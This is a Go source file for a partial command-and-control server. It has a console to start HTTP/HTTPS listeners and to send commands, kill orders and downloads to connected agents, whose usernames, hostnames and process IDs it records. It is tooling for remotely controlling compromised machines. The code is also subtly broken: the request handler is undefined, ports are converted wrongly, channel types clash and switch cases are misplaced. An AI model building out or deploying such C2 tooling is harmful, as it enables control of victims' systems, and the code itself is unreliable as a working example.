package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"log"
	"math/rand"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/satori/go.uuid"

)

var clients = make(map[string]client)
var cd, _ = os.Getwd()

func main() {
	fmt.Println("use 'help' to see the list of commands")
	shell()
	time.Sleep(time.Millisecond * 500)
}


func shell() {
	reader := bufio.NewReader(os.Stdin)

	for {
		fmt.Println()
		fmt.Println()
		fmt.Print("> ")
		input, _ := reader.ReadString('\n')
		stripped := strings.TrimRight(input, "\r\n")
		cmd := strings.Split(stripped, " ")
		switch cmd[0] {
		case "exit":
			os.Exit(0)
		case "help":
			fmt.Println("exit - exits the c2")
			fmt.Println("help - prints this message")
			fmt.Println("listener list - lists all listener types")
			fmt.Println("listener start <type> - creates a new listener of the specified type")
			fmt.Println("listener stop <id> - stops the listener with the specified id")
			fmt.Println("agent list - list all connected agents and info")
			fmt.Println("agent cmd <id> <cmd> - send command to the agent with the specified id")
			fmt.Println("agent kill <id> - stop the agent with the specified id")
			fmt.Println("agent dl <id> - send download for agent with the specified id to run")
		case "listener":
			s := cmd[1]
			switch s {
			case "list":
				fmt.Println(" listener types:")
				fmt.Println("1  - http")
				fmt.Println("2  - https")
			case "start":
				if len(cmd) < 3 {
					fmt.Println("listener start <type>")
					continue
				}
				k := cmd[2]
				switch k {
				case "1":
					l := Listener{
						ID: RandIntAsString(),
						Type: "http",
						Port: 80,
						Running: true,
					}
					go Start(l)
					fmt.Println("listener started")
				case "2":
					l := Listener{
						ID: RandIntAsString(),
						Type: "https",
						Port: 443,
						Running: true,
					}
					go Start(l)
					fmt.Println("listener started")
				default:
					fmt.Println("invalid listener type")
				}
			case "stop":
				if len(cmd) < 3 {
					fmt.Println("listener stop <id>")
					continue
				}
				p := cmd[2]
				q := clients[p].channel
				q <- p
				fmt.Println("listener stopped")
		}
		case "cmd":
			a := cmd[2]
			b := clients[a].channel
			b <- cmd
		}
	}
}

func Start(j Listener) Listener{
	switch j.Type {
	case "http":
		j.Running = true
		// Create a new HTTP server
		http.HandleFunc("/", handler)
		s := &http.Server{
			Addr:           ":" + string(j.Port),
			Handler:        nil,
			ReadTimeout:    10 * time.Second,
			WriteTimeout:   10 * time.Second,
			MaxHeaderBytes: 1 << 20,
		}
		s.ListenAndServe()
		return j
	case "https":
		j.Running = true

		// TLS config code
		d := ""
		fmt.Println("enter path to x509 .crt file: ")
		fmt.Scanln(&d)
		crt := filepath.Join(string(cd), d)
		fmt.Println()
		fmt.Println("enter path to x509 .key file: ")
		fmt.Scanln(&d)
		key := filepath.Join(string(cd), d)

		// file existence check
		_, err_crt := os.Stat(crt)
		if err_crt != nil {
			fmt.Println("error: ", err_crt)
			break
		}
		_, err_key := os.Stat(key)
		if err_key != nil {
			fmt.Println("error: ", err_key)
			break
		}

		cer, err := tls.LoadX509KeyPair(crt, key)

		if err != nil {
			fmt.Println("There was an error importing the SSL/TLS x509 key pair")
			fmt.Println("Ensure a keypair is located in the data/x509 directory")
			fmt.Println(err)
			fmt.Println(" > ")
			break
		}
		//Configure TLS
		config := &tls.Config{
			Certificates: []tls.Certificate{cer},
			//NextProtos: []string{"h2"},
		}

		// Create a new HTTP server
		http.HandleFunc("/", handler)
		s := &http.Server{
			Addr:           ":" + string(j.Port),
			Handler:        nil,
			ReadTimeout:    10 * time.Second,
			WriteTimeout:   10 * time.Second,
			MaxHeaderBytes: 1 << 20,
			TLSConfig: config,
		}
		go log.Fatal(s.ListenAndServeTLS("", ""))
		return j
	}
	return j
}


func Stop(j int) Listener{



	return Listener{}
}

type client struct {
	id       string
	uuid     uuid.UUID
	userName string
	userGUID string
	hostName string
	pid      int
	channel  chan []string
}

type Listener struct {
	ID  string
	Type string
	Port int
	Running bool
}

func RandIntAsString() string {
	rand.Seed(time.Now().UnixNano())
	v := rand.Intn(99999-10000) + 10000
	return strconv.Itoa(v)
}